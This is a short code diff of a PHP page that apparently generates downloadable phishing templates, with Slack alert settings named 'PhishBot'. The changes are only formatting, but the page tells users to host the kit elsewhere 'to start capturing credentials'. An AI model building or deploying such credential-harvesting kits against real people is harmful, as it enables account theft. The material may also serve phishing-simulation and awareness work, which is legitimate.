@@ -37,7 +37,7 @@ if(isset($_REQUEST['Redirect']) && $_REQUEST['Redirect'] != "https://"){$Redirec
 if(isset($_REQUEST['SlackBotName'])){$SlackBotName = $_REQUEST['SlackBotName'];}else{$SlackBotName = "PhishBot";}
 if(isset($_REQUEST['SlackEmoji'])){$SlackEmoji = $_REQUEST['SlackEmoji'];}else{$SlackEmoji = ":fishing_pole_and_fish:";}
 if(isset($_REQUEST['ImageLogo'])){$ImageLogo = $_REQUEST['ImageLogo'];}else{$ImageLogo = "";}
-      
+
 $templatename = preg_replace('/[^a-zA-Z0-9 ]/', '', $_REQUEST['templatename']);
 
 $htmlpath = $templatename."/template.php";
@@ -68,7 +68,7 @@ exec($cmdzipup);
 <button class="btn" style="width:100%" type="submit"><i class="fa fa-download"></i> Download Source HTML</button>
 </FORM>
 <CENTER>
-<FONT COLOR="#FFFFFF">Extract contents into your web directory on another server to start capturing credentials!  Feel free to modify the source code to include your own logo/theme!</FONT>
+<FONT COLOR="#FFFFFF">Extract contents into your web directory on another server to start capturing credentials!<br>Feel free to modify the source code to include your own logo/theme!</FONT>
 </CENTER>
 </BODY>
 </HTML>
